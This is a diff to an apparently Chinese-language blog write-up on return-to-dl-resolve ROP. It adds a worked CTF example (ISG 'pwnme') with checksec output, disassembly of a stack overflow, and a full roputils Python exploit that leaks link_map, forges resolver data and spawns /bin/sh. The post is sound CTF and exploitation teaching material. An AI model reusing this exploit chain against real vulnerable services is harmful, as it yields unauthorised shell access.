@@ -426,6 +426,88 @@ EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow
 
 这里的`r10`保存的便是`link_map`的地址，所以只需`QWORD PTR [r10+0x1c8]`处为`NULL`即可跳过这一段。这便是roputils中这一操作的由来。
 
+## 实例
+
+这里选取的是去年ISG初赛的pwnme。这是一道漏洞很明显，但利用起来较复杂的题目。二进制文件基本信息如下：
+
+{% highlight bash %}
+$ checksec --file pwnme 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   pwnme
+{% endhighlight %}
+
+主函数内即存在溢出，具体汇编代码如下：
+
+{% highlight bash %}
+...
+  4005bd:       55                      push   %rbp
+  4005be:       48 89 e5                mov    %rsp,%rbp
+  4005c1:       48 83 ec 10             sub    $0x10,%rsp
+  4005c5:       bf 3c 00 00 00          mov    $0x3c,%edi
+  4005ca:       e8 c1 fe ff ff          callq  400490 <alarm@plt>
+  4005cf:       ba 13 00 00 00          mov    $0x13,%edx
+  4005d4:       be 84 06 40 00          mov    $0x400684,%esi
+  4005d9:       bf 01 00 00 00          mov    $0x1,%edi
+  4005de:       e8 9d fe ff ff          callq  400480 <write@plt>
+  4005e3:       48 8d 45 f0             lea    -0x10(%rbp),%rax
+  4005e7:       ba 00 01 00 00          mov    $0x100,%edx
+  4005ec:       48 89 c6                mov    %rax,%rsi
+  4005ef:       bf 00 00 00 00          mov    $0x0,%edi
+  4005f4:       e8 a7 fe ff ff          callq  4004a0 <read@plt>
+  4005f9:       b8 00 00 00 00          mov    $0x0,%eax
+  4005fe:       c9                      leaveq
+  4005ff:       c3                      retq
+...
+{% endhighlight %}
+
+可以看到，这里有调用`read`和`write`，可供我们读写内存。但由于二进制文件本身较简略，构造ROP chain比较有技术含量。我们队当时并没有做出来这道题，赛后看writeup，大多是利用ROP来mem leak，读取足够的内存后构造出`execve`得到shell。
+
+但是，如果使用return to dl-resolve技术，利用roputils，则可以1分钟之内傻瓜式解决……我就只是把roputils自带的examples中的`dl-resolve-x86-64.py`稍作修改即完成。改后的代码如下：
+
+{% highlight python %}
+#!/usr/bin/env python2
+
+from roputils import *
+
+fpath = sys.argv[1]
+offset = 0x18
+
+rop = ROP(fpath)
+addr_stage = rop.section('.bss') + 0x400
+ptr_ret = rop.search(rop.section('.fini'))
+
+buf = rop.retfill(offset)
+buf += rop.call_chain_ptr(
+    ['write', 1, rop.got()+8, 8],
+    ['read', 0, addr_stage, 420]
+, pivot=addr_stage)
+buf += rop.fill(0x100, buf)
+
+p = Proc(rop.fpath)
+p.write(buf)
+p.read(0x13)
+addr_link_map = p.read_p64()
+print("link_map is at %s" % hex(addr_link_map))
+addr_dt_debug = addr_link_map + 0x1c8
+
+buf = rop.call_chain_ptr(
+    ['read', 0, addr_dt_debug, 8],
+    [ptr_ret, addr_stage+400]
+)
+buf += rop.dl_resolve_call(addr_stage+300)
+buf += rop.fill(300, buf)
+buf += rop.dl_resolve_data(addr_stage+300, 'system')
+buf += rop.fill(400, buf)
+buf += rop.string('/bin/sh')
+buf += rop.fill(420, buf)
+
+p.write(buf)
+p.write_p64(0)
+p.interact(0)
+{% endhighlight %}
+
+确实相比mem leak构造ROP，简洁太多了……
+
 ## 总结
 
 之前，我的ROP方式，基本都是通过mem leak，读`.got.plt`，找到`system`的地址并调用；极少数情况下，无法mem leak，则是完全根据已有的gadget拼出ROP cain（见[http://rk700.github.io/writeup/2014/11/14/unexploitable/](http://rk700.github.io/writeup/2014/11/14/unexploitable/)）。现在，有了return to dl-resolve，就添加了一种思路。当然，对于64位，这种技术依然需要有读、写内存的gadgets。从理论上讲，有了这些gadgets, mem leak去找`system`的地址应该也可以。但相对来说，return to dl-resolve显得简洁、优雅一些。现在64位return to dl-resolve需要读内存，是为了找到`link_map+0x1c8`的地址以便写入。如果能够继续研究出不需要读内存的方法，则面对当下主流的64位NX, ASLR，return to dl-resolve的可适性会更加高。希望感兴趣的小伙伴可以一同讨论研究，完善这一技术。
